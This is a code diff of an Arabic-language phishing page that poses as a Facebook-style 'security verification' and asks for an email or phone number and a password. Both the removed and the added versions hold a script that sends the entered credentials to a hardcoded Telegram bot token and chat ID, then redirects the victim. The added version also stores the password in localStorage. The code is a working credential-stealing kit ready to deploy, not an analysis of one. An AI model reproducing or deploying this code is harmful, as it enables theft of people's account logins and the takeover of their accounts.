@@ -1,44 +1,24 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-  <meta charset="UTF-8">
-  <title>التحقق الأمني</title>
-  <style>
-    body { background: #f0f2f5; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 320px; text-align: center; }
-    input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 4px; border: 1px solid #ccc; }
-    button { background: #1877f2; color: white; border: none; }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <h2>⚠️ التحقق الأمني</h2>
-    <p>الرجاء إدخال معلومات البريد الإلكتروني لتأكيد هويتك ومتابعة التصفح.</p>
-    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-    <input type="password" id="password" placeholder="كلمة المرور">
-    <button onclick="sendData()">متابعة</button>
-  </div>
+<script>
+function sendData() {
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-  <script>
-    function sendData() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+  // حفظ البيانات مؤقتًا
+  localStorage.setItem("email", email);
+  localStorage.setItem("password", password);
 
-      // إرسال إلى Telegram
-      fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: "7493001551",
-          text: `🔐 تحقق أمني:\n📧 Email: ${email}\n🔑 Password: ${password}`
-        })
-      });
+  // إرسال إلى Telegram
+  fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: "7493001551",
+      text: `📥 تحقق أمني:\n📧 Email: ${email}\n🔑 Password: ${password}`
+    })
+  });
 
-      // تحويل إلى الصفحة الحقيقية بعد الإدخال
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com"; // غيّر الرابط حسب رغبتك
-      }, 1500);
-    }
-  </script>
-</body>
-</html>
+  setTimeout(() => {
+    window.location.href = "enhanced_security.html";
+  }, 1500);
+}
+</script>
